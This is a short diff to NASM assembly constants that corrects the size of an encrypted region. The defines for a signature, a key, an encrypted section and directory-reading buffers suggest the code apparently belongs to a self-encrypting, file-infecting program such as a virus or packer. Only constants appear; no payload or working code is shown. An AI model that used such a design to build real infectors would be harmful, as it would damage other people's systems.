@@ -3,7 +3,7 @@
 %define SIGNATURE_SIZE _end - signature
 %define KEY_SIZE      signature - key
 %define KEY_OFFSET    key - main
-%define ENCRYPT_SIZE key - encrypted_start - 1
+%define ENCRYPT_SIZE key - encrypted_start
 %define ENCRYPT_OFFSET encrypted_start - main
 %define READ_DIR_BUFF_SIZE  256
 %define PATH_BUFF_SIZE      1024
